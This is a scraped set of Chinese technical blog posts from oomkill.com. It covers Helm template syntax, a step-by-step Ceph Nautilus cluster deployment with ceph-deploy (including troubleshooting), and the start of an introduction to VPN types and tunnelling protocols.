用做icon的SVG或PNG图片URL （可选）\rappVersion: 包含的应用版本（可选）。不需要是语义化的\rdeprecated: 不被推荐的chart （可选，布尔值）\rannotations:\rexample: 按名称输入的批注列表 （可选）.\r--dry-run 模拟安装\n--debug 详细的输出\n--generate-name：生成随机实例名\nhelm install --generate-name --dry-run --debug --set favoriteDrink=7up ./testchart\rgo template\n{{ .Values.favoriteDrink }} 读取变量值\nquote go template 函数，引用字符串 ，给变量值加\u0026quot;\u0026quot;\npipeline 可将多个功能连接在一起\n默认值 chart.yaml gender: {{ .values.gender|default \u0026quot;zhangsan\u0026quot; }} values.yaml 中不能加default函数\n流程控制\nif else\n{{ if PIPELINE }}\r# Do something\r{{ else if OTHER PIPELINE }}\r# Do something else\r{{ else }}\r# Default case\r{{ end }}\r如果 pipeline的值被判定为如下的值则为false：\na boolean false a numeric zero an empty string a nil (empty or null) an empty collection (map, slice, tuple, dict, array) 使用 - 摆脱新行{{- if eq .Values.favorite.drink \u0026quot;coffee\u0026quot; }} - 在前面表示删除前面的空行，在后面表示删除后面的空行，{{- 之间没有空格\n{{ indent 2 \u0026quot;mug:true\u0026quot; }} 缩进，缩进的是文字内容不是yaml\n{{with .Values.xxx}} {{end}} 提升作用于，release: {{ $.Release.Name }} 执行时将变量映射到根域，可以在作用域中使用\nReference [1] Implementing a custom Kubernetes authentication method\n[2] Helm 命令行\n[3] Users in Kubernetes\n[4] bootstrap tokens\n[5] Webhook Token Authentication\n","permalink":"https://www.oomkill.com/2019/11/helm/","summary":"","title":"Kubernetes包管理 - Helm"},{"content":"环境配置 Ceph 是一个开源去中心化存储平台，专为满足现代存储需求而设计。 Ceph可扩展至 EB 级，并且设计为无单点故障，使其成为需要高度可用的灵活存储的应用程序的理想选择。\n下图显示了具有 Ceph 存储的示例 3 节点集群的布局。 两个网络接口可用于增加带宽和冗余，这有助于保持足够的带宽来满足存储要求，而不影响客户端应用程序。\n图：Ceph存储集群 Source：https://www.jamescoyle.net/how-to/1244-create-a-3-node-ceph-storage-cluster\n图中架构表示了一个无单点故障的 3 节点 Ceph 集群，以提供高度冗余的存储。 每个节点都配置了两个磁盘； 一台运行 Linux 操作系统，另一台将用于 Ceph 存储。 下面的输出显示了可用的存储空间，每个主机上的存储空间完全相同。 /dev/sda 是包含操作系统安装的根分区， /dev/sdb 是一个未触及的分区，将用于部署 Ceph 集群，对应的硬件信息如下表所示。\n主机名 public IP cluster IP 数据盘 ceph-nautilus01 10.0.0.50 10.0.0.50 /dev/sda\n/dev/sdb ceph-nautilus02 10.0.0.51 10.0.0.51 /dev/sda/dev/sdb ceph-nautilus03 10.0.0.52 10.0.0.52 /dev/sda/dev/sdb ceph-control 10.0.0.49 10.0.0.49 /dev/sda 部署工具 ceph-deploy 工具是在 “管理节点” (ceph-admin) 上的目录中运行。\nceph-deploy 部署ceph的原生工具 (最后支持版本 octopus 15) 借助于ssh来管理目标主机，sudo,和一些 python 模块来完成 ceph 集群的部署和后期维护。 一般讲 ceph-deploy 放置在专用节点，作为 ceph 集群的管理节点。 ceph-deploy 不是一个通用的部署工具，只是用于管理Ceph集群的，专门为用户快速部署并运行一个Ceph集群，这些功能和特性不依赖于其他的编排工具。 它无法处理客户端的配置，因此在部署客户端时就无法使用此工具。 下图是来自 ceph 官网的 ceph-deploy 部署工具的一个模型图\n图：ceph-deploy部署模型 Source：https://docs.ceph.com/en/nautilus/start/quick-start-preflight/\nCEPH 集群拓扑及网络 在Ceph内部存在两种流量：\nCeph内部各节点之间用来处理OSD之间数据复制，因此为了避免正常向客户端提供服务请求， public network 必须，所有客户端都应位于public network cluster network 可选 ceph-deploy 先决条件配置 将 Ceph 安装仓库添加到 “管理节点”。然后，安装 ceph-deploy。\nDebian/Ubuntu 添加 release key wget -q -O- 'https://download.ceph.com/keys/release.asc' | sudo apt-key add - 将 Ceph deb添加到您的存储库。并替换为安装的 Ceph 版本（例如 nautilus）。例如： export CEPH_VERSION=nautilus echo deb https://download.ceph.com/debian-${CEPH_VERSION}/ $(lsb_release -sc) main | sudo tee /etc/apt/sources.list.d/ceph.list 更新仓库并安装 ceph-deploy sudo apt update sudo apt install ceph-deploy RHEL/CentOS 安装 epel 源，这里方式很多可以任意选择 “你所在地区可用的 epel 源” sudo yum install -y https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm 添加 Ceph rpm 仓库 export CEPH_VERSION=nautilus cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/yum.repos.d/ceph.repo [ceph] name=Ceph packages for $basearch baseurl=https://download.ceph.com/rpm-${CEPH_VERSION}/el7/\\$basearch enabled=1 priority=2 gpgcheck=1 gpgkey=https://download.ceph.com/keys/release.asc [ceph-noarch] name=Ceph noarch packages baseurl=https://download.ceph.com/rpm-${CEPH_VERSION}/el7/noarch enabled=1 priority=2 gpgcheck=1 gpgkey=https://download.ceph.com/keys/release.asc [ceph-source] name=Ceph source packages baseurl=https://download.ceph.com/rpm-${CEPH_VERSION}/el7/SRPMS enabled=0 priority=2 gpgcheck=1 gpgkey=https://download.ceph.com/keys/release.asc EOF 更新缓存并安装 ceph-deploy sudo yum clean all \u0026amp;\u0026amp; sudo yum makecache sudo yum install ceph-deploy 安装集群的预先条件 - CEPH NODE 管理节点必须拥有所有 ceph node 的无密码登录权限 ntp 开放端口 关闭 selinux 创建用于 ceph-deploy 的用户 ceph-deploy 实用程序必须以具有无密码 sudo 权限的用户身份登录 Ceph node，因为它需要在不提示输入密码的情况下安装软件和配置文件。\n最新版本的 ceph-deploy 支持 \u0026ndash;username 选项，因此您可以指定任何具有无密码的 sudo 用户（包括 root，但不推荐）。要使用 ceph-deploy \u0026ndash;username {username}，“所指定的用户必须具有对 Ceph Node 的无密码 SSH 访问权限”，因为 ceph-deploy 不会提示您输入密码。\nCeph 官方建议在集群中的所有 Ceph 节点上为 ceph-deploy 创建特定用户。==请不要使用 “ceph” 作为用户名==。整个集群中的统一用户名可能会提高易用性（不是必需的），但您应该避免使用明显的用户名，因为黑客通常会通过暴力破解来使用它们（例如 root, admin, 或使用项目名称）。以下过程将 {username} 替换为您定义的用户名，描述了如何使用无密码 sudo 创建用户。\n在每个 Ceph Node 创建一个用户 export CEPH_USERNAME=ceph sudo useradd -d /home/${CEPH_USERNAME} -m ${CEPH_USERNAME} echo 1|sudo passwd ${CEPH_USERNAME} --stdin 对于添加到每个 Ceph Node 的新用户，请确保该用户具有 sudo 权限。 echo \u0026quot;${CEPH_USERNAME} ALL = (root) NOPASSWD:ALL\u0026quot; | sudo tee /etc/sudoers.d/${CEPH_USERNAME} sudo chmod 0440 /etc/sudoers.d/${CEPH_USERNAME} 启用 SSH 无密码登录 由于 ceph-deploy 不会提示输入密码，因此必须在管理节点上生成 SSH 密钥并将公钥分发到每个 Ceph 节点。 ceph-deploy 将尝试为初始 monitor 生成 SSH 密钥。\n生成 ssh key，不要使用 sudo 或者是 root 用户 $ ssh-keygen Generating public/private key pair. Enter file in which to save the key (/ceph-admin/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /ceph-admin/.ssh/id_rsa. Your public key has been saved in /ceph-admin/.ssh/id_rsa.pub. 将 SSH 密钥复制到每个 Ceph Node，将变量 “CEPH_USERNAME” 替换为创建 Ceph 部署用户创建的用户名。 通常情况下，主机名需要解析的，如果没有需要配置在 /etc/hosts 内\nssh-copy-id ${CEPH_USERNAME}@ceph-nautilus01 ssh-copy-id ${CEPH_USERNAME}@ceph-nautilus02 ssh-copy-id ${CEPH_USERNAME}@ceph-nautilus03 # 如果是 root 用户执行下面命令 sudo -u ${CEPH_USERNAME} ssh-copy-id ${CEPH_USERNAME}@ceph-nautilus01 sudo -u ${CEPH_USERNAME} ssh-copy-id ${CEPH_USERNAME}@ceph-nautilus02 sudo -u ${CEPH_USERNAME} ssh-copy-id ${CEPH_USERNAME}@ceph-nautilus03 添加主机名到 /etc/hosts (可选) $ tee \u0026gt;\u0026gt; /etc/hosts \u0026lt;\u0026lt; EOF 10.0.0.50 ceph-nautilus01 10.0.0.51 ceph-nautilus02 10.0.0.52 ceph-nautilus03 EOF 网卡开机自启动 Ceph OSD Peer 并通过网络向 Ceph monitor 报告。如果默认情况下网络处于关闭状态，则在启用网络之前，Ceph 集群无法在启动期间联机。\n在一些 Linux 发行版下（例如 CentOS）上的默认配置默认关闭网络接口。确保在启动过程中网络接口打开，以便 Ceph 守护进程可以通过网络进行通信。(如果你的系统是新装的)\n开放所需端口 Ceph Monitor (ceph-mon) 默认使用端口 6789 进行通信。默认情况下，Ceph OSD 在 6800:7300 端口范围内进行通信。详细信息请参见网络配置参考 [1]。\n确保关闭 SELinux 在 CentOS 和 RHEL 上，SELinux 默认设置为“Enforcing”。为了简化您的安装，我们建议将 SELinux 设置为 Permissive 或完全禁用，这是 Ceph 官方给出的建议\nsudo setenforce 0 要持久配置 SELinux（如果 SELinux 存在问题，则建议这样做），请修改 /etc/selinux/config 中的配置文件。\nPreferences 确保您的 “包管理器” 已安装并启用 “priority/preferences”。在 CentOS 上，您可能需要安装 EPEL。在 RHEL 上，您可能需要启用可选存储库。\nsudo yum install yum-plugin-priorities 例如，在 RHEL 7 服务器上，执行以下命令安装 yum-plugin-priorities 并启用 rhel-7-server-optional-rpms 存储库：\nsudo yum install yum-plugin-priorities --enablerepo=rhel-7-server-optional-rpms 初始化新的 CEPH 集群 在这里我们创建一个包含一个 Ceph Monitor (ceph-mon) 和 三个 Ceph OSD (osd daemon) 的 Ceph 集群。通常使用 ceph-deploy 部署集群，最佳方式是在 “管理节点” 上创建一个目录，用于维护 ceph-deploy 为集群生成的配置文件和密钥。\nmkdir ceph-cluster \u0026amp;\u0026amp; cd ceph-cluster 需要注意的是，ceph-deploy 将文件输出到当前目录。执行 ceph-deploy 时需要确保位于此目录中。\n还需要注意的是，需要使用 “SSH 免密的那个用户”\n确保集群节点清洁性 如果在任何时候遇到问题后并想重新开始，可以执行下列命令清除所有安装包和配置：\nceph-deploy purge {ceph-node} [{ceph-node}] ceph-deploy purgedata {ceph-node} [{ceph-node}] ceph-deploy forgetkeys rm ceph.* 需要注意的是，执行 ceph-deploy，必须执行第四条命令 rm ceph.*\n创建集群 创建集群会生成配置文件保存到当前工作目录中，使用 ceph-deploy 执行命令新建一个集群。\n创建集群 # 语法 ceph-deploy new {initial-monitor-node(s)} # 示例, 指定节点的 hostname, fqdn or hostname:fqdn ceph-deploy new ceph-nautilus01 ceph-nautilus02 ceph-nautilus03 ceph-deploy 会输出到当前文件夹下的文件包含，Ceph 配置文件 (ceph.conf)、ceph-mon 的 keyring 文件 (ceph.mon.keyring) 以及新集群的日志文件。\n如果主机存在多个网络接口（即公共网络和集群网络是分开的），需要在 Ceph 配置文件的 [global] 部分下添加公共网络设置。 public network = {ip-address}/{bits} # 示例 public network = 10.1.2.0/24 或者通过命令指定两个网络的 IP\nceph-deploy new ceph-nautilus01 ceph-nautilus02 ceph-nautilus03 \\ --cluster-network 172.18.0.0/24 \\ --public-network 10.0.0.0/24 如果在 IPv6 环境中部署，请将以下内容添加到本地目录中的 ceph.conf 中： echo ms bind ipv6 = true \u0026gt;\u0026gt; ceph.conf 现在可以安装 ceph 软件包了，执行下列命令 ceph-deploy install {ceph-node} [...] # 示例 ceph-deploy install ceph-nautilus01 ceph-nautilus02 ceph-nautilus03 在命令执行后，ceph-deploy 将在每个节点上安装 Ceph，所以要确保对应节点需要提前安装好了 ceph yum 仓库文件\n也可以通过 --release 指定版本进行安装\nceph-deploy install --release=nautilus ceph-nautilus01 ceph-nautilus02 ceph-nautilus03 部署 ceph-mon 并收集密钥： ceph-deploy mon create-initial ​\t通常完成步骤5后，本地工作目录应具有以下 keyring 文件：\nceph.client.admin.keyring ceph.bootstrap-mgr.keyring ceph.bootstrap-osd.keyring ceph.bootstrap-mds.keyring ceph.bootstrap-rgw.keyring ceph.bootstrap-rbd.keyring ceph.bootstrap-rbd-mirror.keyring 使用 ceph-deploy 将配置文件和管理密钥复制到管理节点和 Ceph Node，以便可以在这些节点上使用 ceph CLI 时而无需在每次执行命令时指定 ceph-mon 地址和 keyring文件 (ceph.client.admin.keyring)。 ceph-deploy admin {ceph-node(s)} # 示例 ceph-deploy admin ceph-nautilus01 ceph-nautilus02 ceph-nautilus03 部署 CEPH MANAGER (ceph-mgr)，此步骤仅需要 ==luminous+== 以上版本 ceph-deploy mgr create {ceph-node(s)} *Required only for luminous+ builds, i.e \u0026gt;= 12.x builds* # 示例 ceph-deploy mgr create ceph-nautilus01 到步骤8时，只差 OSD 就完成了 RADOS 集群的安装，下面为集群添加 OSD ceph-deploy osd create --data {device} {ceph-node} # 示例 ceph-deploy osd create --data /dev/sdb ceph-nautilus01 ceph-deploy osd create --data /dev/sdb ceph-nautilus02 ceph-deploy osd create --data /dev/sdb ceph-nautilus03 Note：如果要在 LVM 卷上创建 OSD，则 \u0026ndash;data 的参数必须是 {volume_group}/{lv_name}，而不是卷的块设备的路径\n检查集群状态 ssh node1 sudo ceph health # or ceph -s Troubleshooting No module named pkg_resources $ ceph-deploy new ceph-nautilus01 ceph-nautilus02 ceph-nautilus03 Traceback (most recent call last): File \u0026quot;/usr/bin/ceph-deploy\u0026quot;, line 18, in \u0026lt;module\u0026gt; from ceph_deploy.cli import main File \u0026quot;/usr/lib/python2.7/site-packages/ceph_deploy/cli.py\u0026quot;, line 1, in \u0026lt;module\u0026gt; import pkg_resources ImportError: No module named pkg_resources 解决：This issue can be solved by installing yum install -y python-setuptools.\nRuntimeError: NoSectionError: No section: \u0026lsquo;ceph\u0026rsquo; [2019-09-11 05:31:42,640][ceph-nautilus01][DEBUG ] Installing : ceph-release-1-1.el7.noarch 1/1 [2019-09-11 05:31:42,640][ceph-nautilus01][DEBUG ] warning: /etc/yum.repos.d/ceph.repo created as /etc/yum.repos.d/ceph.repo.rpmnew [2019-09-11 05:31:42,759][ceph-nautilus01][DEBUG ] Verifying : ceph-release-1-1.el7.noarch 1/1 [2019-09-11 05:31:42,759][ceph-nautilus01][DEBUG ] [2019-09-11 05:31:42,759][ceph-nautilus01][DEBUG ] Installed: [2019-09-11 05:31:42,759][ceph-nautilus01][DEBUG ] ceph-release.noarch 0:1-1.el7 [2019-09-11 05:31:42,759][ceph-nautilus01][DEBUG ] [2019-09-11 05:31:42,759][ceph-nautilus01][DEBUG ] Complete! [2019-09-11 05:31:42,759][ceph-nautilus01][WARNING] ensuring that /etc/yum.repos.d/ceph.repo contains a high priority [2019-09-11 05:31:42,767][ceph_deploy][ERROR ] RuntimeError: NoSectionError: No section: 'ceph' 解决：CEPH Node 上不要安装 yum 仓库，ceph-deploy 会自动安装，如果存在新的文件会被命名为 ceph.repo.rpmnew\n向 RADOS 集群添加 OSD 列出并擦净磁盘 ceph-deploy disk 命令可以检查并列出OSD节点上所有可用的磁盘相关的信息。\nceph-deploy disk list stor01 stor02 stor03 stor04 如果遇到 Running command: sudo fdisk -l 无输出，原因为系统问中文，修改 en_us.utf8 后可正常显示。\n$ ceph-deploy disk list stor01 [ceph_deploy.conf][DEBUG ] found configuration file at: /home/cephadmin/.cephdeploy.conf [ceph_deploy.cli][INFO ] Invoked (2.0.1): /bin/ceph-deploy disk list stor01 [ceph_deploy.cli][INFO ] ceph-deploy options: [ceph_deploy.cli][INFO ] username : None [ceph_deploy.cli][INFO ] verbose : False [ceph_deploy.cli][INFO ] debug : False [ceph_deploy.cli][INFO ] overwrite_conf : False [ceph_deploy.cli][INFO ] subcommand : list [ceph_deploy.cli][INFO ] quiet : False [ceph_deploy.cli][INFO ] cd_conf : \u0026lt;ceph_deploy.conf.cephdeploy.Conf instance at 0x7fab61201488\u0026gt; [ceph_deploy.cli][INFO ] cluster : ceph [ceph_deploy.cli][INFO ] host : ['stor01'] [ceph_deploy.cli][INFO ] func : \u0026lt;function disk at 0x7fab6144e9b0\u0026gt; [ceph_deploy.cli][INFO ] ceph_conf : None [ceph_deploy.cli][INFO ] default_release : False [stor01][DEBUG ] connection detected need for sudo [stor01][DEBUG ] connected to host: stor01 [stor01][DEBUG ] detect platform information from remote host [stor01][DEBUG ] detect machine type [stor01][DEBUG ] find the location of an executable [stor01][INFO ] Running command: sudo fdisk -l 而后，在管理节点上使用 ceph-deploy 命令 擦除计划专用于OSD磁盘上的所有分区表和数据以便用于OSD，命令格式为ceph-deploy disk zab {osd-server-name} {disk-name}，需要注意的是此步会清除目标设备上的所有数据。\n擦除一个磁盘\nceph-deploy disk zap ceph-deploy disk zap {ceph_node} /dev/sdb Note：如果是未格式化的块设备不需要额外擦除，ceph 集群要求 ceph 管理的块设备必须是未格式化的，如果格式化过的需要擦除\nceph-deploy osd \u0026ndash;help：\nblock-db 可以理解为RocksDB数据库，元数据存放的位置 block-wal 数据库的数据日志存放的位置 filestore 如果使用filestore,明确指定选项--filestore 指明数据放哪，并指明日志放哪（日志指的是文件系统日志）ceph-deploy osd create {node} --filestore --data /path/to/data --journal /path/to/journal bluestore自身没有文件系统，故无需日志，数据库需要日志 扩展集群 添加 OSD 当一个 “基本集群” 部署好并运行，下一步就是扩展集群。通常会扩展集群，扩展集群存在两种类型，集群组件与OSD，这里主要围绕 扩展 OSD\n早期版本的ceph-deploy命令支持在将添加OSD的过程分为两个步骤：准备OSD，激活OSD，但新版本中，此种操作方式已被废除，添加OSD的步骤只能由命令 ceph-deploy osd create create {node} \u0026ndash;data {data-disk} ，一次完成，默认存储引擎为 bluestore\nceph-deploy osd create {node} --data /dev/sdb ceph-deploy osd create {node} --data /dev/sdc 而后可使用 ceph-deploy osd list {node} 命令列出指定节点上的OSD：\n移除 OSD 的 Ceph集群中的一个OSD通常对应一个设备，且运行于专用的守护进程。在某OSD设备出现故障，或管理员出于管理只需确实要移除特定的OSD设备时，需要先停止相关的守护进程，而后再进行移除操作。对于Luminous及其之后的版本来说，停止和移除命令的格式如下\n停止设备: ceph osd out {osd-num} 停止进程: sudo systemctl stop ceph-osd@{osd-num} 移除设备: ceph osd purge {id} \u0026ndash;yes-i-really-mean-it 若类似如下的OSD的设备信息存在于ceph.conf配置文件中，管理员在删除OSD之后手动将其删除。\n[osd.1] host = {hostname} 不过，对于 Luminous 之前的版本来说，管理员需要依次手动执行如下步骤删除OSD设备\n于CRUSH运行图中移除设备: ceph osd crush remove {name} 移除OSD的认证key: ceph auth del osd.{osd-num} 移除设备: ceph osd purge {id} \u0026ndash;yes-i-really-mean-it 扩展 ceph-mon Ceph 集群需要至少一个 Ceph Monitor 和一个 Ceph Manager，生产环境中，为了实现高可用，Ceph集群通常运行多个监视器，以免单监视器整个存储集群崩溃。Ceph使用 Paxos 算法，改算法是需要至少需要板书以上的监视器（大于n/2，其中n为总监视器数量），才能形成法定人数，尽管此非必须，奇数个 ceph-mon 往往更好。\n使用 ceph-deploy mon add {nodes} 命令可以一次添加一个 ceph-mon 到集群中。\nceph-deploy mon add nautilus02 ## 此处使用短格式名称，长格式名称会报错。 ceph-deploy mon add nautilus03 设置完成后，可以在ceph客户端上查看监视器及法定人数的相关信息:\n$ ceph quorum_status --format json-pretty { \u0026quot;election_epoch\u0026quot;: 20, \u0026quot;quorum\u0026quot;: [ 0, 1, 2 ], \u0026quot;quorum_names\u0026quot;: [ \u0026quot;stor01\u0026quot;, \u0026quot;stor02\u0026quot;, \u0026quot;stor03\u0026quot; ], \u0026quot;quorum_leader_name\u0026quot;: \u0026quot;stor01\u0026quot;, \u0026quot;monmap\u0026quot;: { \u0026quot;epoch\u0026quot;: 3, \u0026quot;fsid\u0026quot;: \u0026quot;69fb9b55-3fb5-42d0-8cf7-239a3b569791\u0026quot;, \u0026quot;modified\u0026quot;: \u0026quot;2019-06-06 21:19:41.274199\u0026quot;, \u0026quot;created\u0026quot;: \u0026quot;2019-06-05 12:35:31.143594\u0026quot;, \u0026quot;features\u0026quot;: { \u0026quot;persistent\u0026quot;: [ \u0026quot;kraken\u0026quot;, \u0026quot;luminous\u0026quot;, \u0026quot;mimic\u0026quot;, \u0026quot;osdmap-prune\u0026quot; ], \u0026quot;optional\u0026quot;: [] }, \u0026quot;mons\u0026quot;: [ { \u0026quot;rank\u0026quot;: 0, \u0026quot;name\u0026quot;: \u0026quot;stor01\u0026quot;, \u0026quot;addr\u0026quot;: \u0026quot;10.0.0.4:6789/0\u0026quot;, \u0026quot;public_addr\u0026quot;: \u0026quot;10.0.0.4:6789/0\u0026quot; }, { \u0026quot;rank\u0026quot;: 1, \u0026quot;name\u0026quot;: \u0026quot;stor02\u0026quot;, \u0026quot;addr\u0026quot;: \u0026quot;10.0.0.5:6789/0\u0026quot;, \u0026quot;public_addr\u0026quot;: \u0026quot;10.0.0.5:6789/0\u0026quot; }, { \u0026quot;rank\u0026quot;: 2, \u0026quot;name\u0026quot;: \u0026quot;stor03\u0026quot;, \u0026quot;addr\u0026quot;: \u0026quot;10.0.0.6:6789/0\u0026quot;, \u0026quot;public_addr\u0026quot;: \u0026quot;10.0.0.6:6789/0\u0026quot; } ] } } 扩展 Manager 节点 Ceph Manager (ceph-mgr) 以 Active/Standy 模式运行，部署其他 ceph-mgr 守护进程可确保在 Active 节点的 ceph-mgr 守护进程故障时，其中一个 Standby 实例可以在不中断服务的情况下接管其任务。\nmgr 就是无状态的 web 服务，一般来讲两个足够了。\nceph-deploy mgr create {ceph_node} 启动 RGW RGW (Rados Gateway) 必要组件，仅在需要用到对象存储兼容 “S3” 和 “Swift” 的 RESTful 接口时才需要部署 RGW 实例，相关的命令为ceph-deploy rgw create (gateway-node) 。\nradosgw需要用自用的存储池不能与RBD混合使用，RGW 会在创建时自动初始化出存储池来，RGW 需要有相应服务才能运行起来。\nceph-deploy rgw create nautilus02 添加完成后，ceph -s 命令的 service 一段中会输出相关信息：\n$ ceph -s cluster: id: 69fb9b55-3fb5-42d0-8cf7-239a3b569791 health: HEALTH_WARN application not enabled on 1 pool(s) services: mon: 3 daemons, quorum stor01,stor02,stor03 mgr: stor01(active), standbys: stor04 osd: 8 osds: 8 up, 8 in rgw: 1 daemon active data: pools: 7 pools, 160 pgs objects: 196 objects, 1.5 KiB usage: 21 GiB used, 79 GiB / 100 GiB avail pgs: 160 active+clean 默认情况下，RGW 实例监听于 TCP 协议的 7480 端口，需要修改，可以通过在运行 RGW 的节点上编辑其主配置文件 ceph.conf 进行修改，相关参数如下所示\n[client] rgw_frontends = \u0026quot;civetweb port=8080\u0026quot; RGW 会在 RADOWS 集群上生成包括如下存储池的一系列存储池\n$ ceph osd pool ls mypool rbdpool testpool .rgw.root default.rgw.control default.rgw.meta default.rgw.log RGW 提供的是兼容 S3 和 Swift 的 REST 接口，客户端通过 HTTP 进行交互，完成数据的增删改查等管理操作。\n启用文件系统 (CephFS) 接口 CephFS 需要至少运行一个 Metadata (MDS) 守护进程 (ceph-mds)，此进程管理与 CephFS 上存储的文件相关的元数据，并协调对 Ceph存储集群的访问。因此，若要使用 CephFS ，需要在存储集群中至少部署一个 MDS 实例，增加 MDS 可以使用命令 ceph-deploy mds create {ceph-node} 完成\n还需主义的是，每个 CephFS 都至少需要两个存储池，一个用来存放元数据 (Metadata Pool)，一个存放数据 (Data Pool)。\n$ ceph-deploy mds create stor01 查看 MDS 的相关状态可以发现，刚添加的 MDS 处于 standby 状态\n在运行起来还不够，还没为其创建存储池，故其不能正常工作，处于standby模式。\n$ ceph mds stat , 1 up:standby 使用 CephFS 之前需要事先于集群中创建一个文件系统，并为其分别指定 “元数据” 和 “数据” 相关的存储池，下面创建一个名为 cephfs 的文件系统用于测试，使用cephfs-metadata为数据存储池，使用cephfs-data为数据存储池。\n# 创建存储池 ceph osd pool create cephfs-metadata 64 ceph osd pool create cephfs-data 64 # 创建 cephfs ## 语法 ceph fs new {fs_name} {meatadata-pool} {data-pool} ## 示例 ceph fs new cephfs cephfs-metadata cephfs-data ceph fs add_data_pool： 额外添加数据池 ceph fs new： 创建新文件系统 ceph fs status： 查看CephFS 文件系统状态 $ ceph fs status cephfs cephfs - 0 clients ====== +------+--------+--------+---------------+-------+-------+ | Rank | State | MDS | Activity | dns | inos | +------+--------+--------+---------------+-------+-------+ | 0 | active | stor02 | Reqs: 0 /s | 10 | 13 | +------+--------+--------+---------------+-------+-------+ +-----------------+----------+-------+-------+ | Pool | type | used | avail | +-----------------+----------+-------+-------+ | cephfs-metadata | metadata | 2286 | 21.7G | | cephfs-data | data | 0 | 21.7G | +-----------------+----------+-------+-------+ +-------------+ | Standby MDS | +-------------+ +-------------+ MDS version: ceph version 13.2.6 (7b695f835b03642f85998b2ae7b6dd093d9fbce4) mimic (stable) Reference [1] Network Configuration Reference\n[2] ceph_deploy RuntimeError: NoSectionError: No section: \u0026lsquo;ceph\u0026rsquo;\n","permalink":"https://www.oomkill.com/2019/11/02-2-install-ceph-with-ceph-deploy/","summary":"","title":"Ceph集群安装 - ceph-deploy"},{"content":"什么是VPN VPN ( Virtual Private Network) 虚拟专用网络，是依靠ISP和其他的NSP，在公共网络中建立专用的数据通信网络的技术，可以为企业与企业之间或者个人与企业之间提供安全的数据传输隧道服务。在VPN中任意两点之间的连接并没有传统专网所需的端到端的物理链路，而是利用公共网络资源动态组成的，可以理解为通过私有的隧道技术在公共数据网络上模拟出来的和专网有同样功能的点到点的专线技术，所谓虚拟是指不需要去拉实际的长途物理线路，而是借用了公共Internet网络实现。\nvpn直观的形象图：\nVPN Server/Client \u003c---------------------------------\u003e VPN Server/Client\rVPN的作用 VPN功能可以帮助公司里的远程用户(出差，家里)、公司的分支机构、商业合作伙伴及供应商等公司和自己的公司内部网络之间建立可信的安全连接或者是局域网连接，确保数据的加密安全传输和业务访问，对至运维工程师来说，还可以连接不同的机房为局域网，处理相关的业务流。我们可以通过一张网络逻辑图来描述VPN的作用。\n图：OpenVPN架构\rSource：https://www.slideteam.net/vpn-tunnel-architecture-connecting-corporate-and-branch-office.html\nVPN的分类 我们根据VPN的常见企业应用，将VPN分为以下4类应用\n远程访问VPN服务 即通过个人电脑远程拨号到企业办公网络。\n一般为企业内部员工出差、休假或特殊情况下在远离办公室的时候，又有需求访问公司的内部网络获取相关资源，就可以通过VPN拨号到公司内部.此时远程拨号的员工和办公室内的员工以及其他拨号的员工之间都相当于一个局域网络内。例如:访问内部的域控制器，文件服务器，OA系统，ERP, HTTP服务，内网聊天工具等局域网服务应用。\n对于运维人且就是需要个人电脑远程拨号到企业网站IDC机房，远程维护内网服务器（一般无外网IP）。\n此点是技术人员特别是运维人且在工作中会经常用这个方法维护大量的机房内无外网的服务器及网络设备。\n企业内部网络之间VPN服务 在公司的分支机构的局域网和公司总部LAN之间的VPN连接。通过公网Internet建立VPN将公司在各地的分支机构的LAN连接到公司总部的LAN。例如:各大超市之间业务结算等。\n这是由于地域的原因而产生的VPN的需求，通过VPN让不同地域内的机器可以互相访问，就好像是一个局域网一样。例如：办公室互联协同办公，机房互联数据同步及业务访问等。\n互联网公司多IDC机房之间VPN服务 此处是运维架构人员需要考虑的问题。不同机房之间业务管理和业务访问，数据流动。\n企业外部VPN服务 在供应商、合作伙伴的LAN和本公司的LAN之间建立的VPN服务。\n访问外国网站 翻墙的应用\n常贝隧道协议介绍 PPTP 点对点隧道协议(PPTP)是由包括微软和3Com等公司组成的PPTP论坛开发的一种点对点隧道协议，基于拨号使用的PPP协议，使用PAP或CHAP之类的加密算法，或者使用Microsoft的点对点加密算法MPPE。其通过跨越基于TCP/IP的数据网络创建VPN。实现了从远程客户端到专用企业服务器之间数据的安全传输。PPTP支持通过公共网络(例如Internet)建立按需的、多协议的、虚拟专用网络。PPTP允许加密IP通讯，然后在要跨越公司IP网络或公共IP网络(如Internet)发送的IP头中对其进行封装。典型的linux平台的开源软件为pptp。\nPPTP属于点对点方式的应用，比较适合远程的企业用户拨号到企业进行办公等的应用。\nL2TP L2TP第2层隧道协议(L2TP)是IETF基于L2F (Cisco的第二层转发协议)开发的PPTP的后续版本。是一种工业标准Internet隧道协议，其可以为跨越面向数据包的媒体发送点到点协议(PPP)框架提供封装。PPTP和L2TP都使用PPP协议对数据进行封装，然后添加附加包头用于数据在互联网络上的传输。PPTP只能在两端点间建立单一隧道。L2TP支持在两端点间使用多隧道，用户可以针对不同的服务质量创建不同的隧道。L2TP可以提供隧道验证，而PPTP则不支持隧道验证。但是当L2TP或PPTP 与 IPSEC 共同使用时，可以由IPSEC提供隧道验证，不需要在第2层协议上验证隧道使用L2TP。PPTP要求互联 网络为IP网络。L2TP只要求隧道媒介提供面向数据包的点对点的连接，L2TP可以在IP(使用UDP)，帧中继永久虚拟电路(PVCs)，X.25虚拟电路(VCs)或ATM VCs网络上使用。\nL2TP (Layer 2 Tunneling Protocol)\n在计算机网络中，第2层隧道协议（L2TP）是一种隧道协议，用于支持虚拟专用网络（VPN）或作为ISP提供服务的一部分。它本身不提供任何加密或机密性。相反，它依靠它在隧道内传递的加密协议来提供隐私。\n由于L2TP协议缺乏固有的机密性，因此通常与IPsec一起实施。这被称为L2TP / IPsec，并在IETF RFC 3193中进行了标准化。\nReference L2TP\nIPSec IP安全协议(IPSec: IP Security)实际上是一套协议包而不是一个独立的协议。从1995年开始IPSec的研究以来，IETF IPSec工作组在它的主页上发布了几十个Internet草案文献和12个RFC文件。其中，比较重要的有RFC2409 IKE(互连网密钥交换)、RFC2401 IPSec协议、RFC2402 AH验证包头、RFC2406 